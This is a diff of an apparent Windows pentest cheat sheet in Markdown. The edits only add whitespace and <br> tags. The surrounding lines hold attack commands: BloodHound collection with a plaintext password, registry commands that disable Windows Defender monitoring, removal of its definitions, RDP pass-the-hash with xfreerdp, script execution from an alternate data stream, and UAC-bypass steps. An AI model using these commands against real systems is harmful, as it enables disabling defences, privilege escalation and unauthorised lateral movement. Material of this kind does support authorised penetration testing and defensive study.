@@ -1510,11 +1510,12 @@ bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local
 ```
  “C:\Program Files\Windows Defender\MpCmdRun.exe” -removedefinitions -all
  
- REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
 
 REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
 
 ```
+<br>
 <br>
 
 ### Disable_Restricted_Admin
@@ -1535,6 +1536,9 @@ xfreerdp /u:admin /pth:HASH /v:<IP> /cert-ignore
 accesschk.exe "currentuser" C:\Windows -wus
 ```
 
+<br>
+<br>
+
 
 ### Alternate_Data_Stream_Execution
 
@@ -1544,6 +1548,7 @@ accesschk.exe "currentuser" C:\Windows -wus
 3. Verify - dir /r “C:\windows\somefile.log”
 4. wscript “C:\windows\somefile.log:test.js”
 ```
+
 <br>
 <br>
 
@@ -1555,6 +1560,8 @@ accesschk.exe "currentuser" C:\Windows -wus
 3. Might need to run twice and then execute the function 'Bypassuac'
 4. Check Listener and verify 'whoami /groups'. Your looking for 'High mandatory level'
 ```
+
+<br>
 <br>
 
 ```powershell
